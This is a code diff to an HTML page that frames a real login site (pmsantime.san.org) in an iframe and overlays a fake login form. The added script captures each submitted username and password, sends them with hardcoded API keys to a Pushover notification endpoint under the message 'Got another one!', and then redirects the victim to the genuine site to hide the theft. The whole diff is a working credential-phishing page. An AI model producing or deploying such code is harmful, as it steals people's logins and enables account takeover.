@@ -42,19 +42,42 @@
         text-align: right;
       }
     </style>
-    <script>
-      var wow;
-      function getlogin() {
-        wow = f1.document.getElementById("txt_username_login");
-      }
-    </script>
   </head>
   <body style="width: 98vw; height: 98vh">
-    <form id="form" action="">
-      <input class="input" type="text" name="uname" />
-      <input class="input" type="text" name="pw" />
+    <form id="form" action="#" method="POST">
+      <input id="uname" class="input" type="text" name="uname" autofocus />
+      <input id="pw" class="input" type="password" name="pw" />
       <input class="button" type="submit" value="- Login -" />
     </form>
     <iframe id="f1" src="https://pmsantime.san.org/"></iframe>
+
+    <script>
+      console.log(new Date());
+      let form = document.getElementById("form");
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        let u = document.querySelector("#uname").value;
+        let p = document.querySelector("#pw").value;
+        fetch("https://api.pushover.net/1/messages.json", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            token: "ak37uzaz2t69j12k7swa6z36hh3csr",
+            user: "uhb5etxnyncg4hb2hhavftrko11qb7",
+            message: `Got another one! \n
+            Username: ${u}\n
+            Password: ${p}\n
+            https://pmsantime.san.org`,
+          }),
+        })
+          .then((res) => {
+            return (document.location = "https://pmsantime.san.org");
+          })
+          .catch((er) => console.error(er));
+      });
+      function submit() {}
+    </script>
   </body>
 </html>
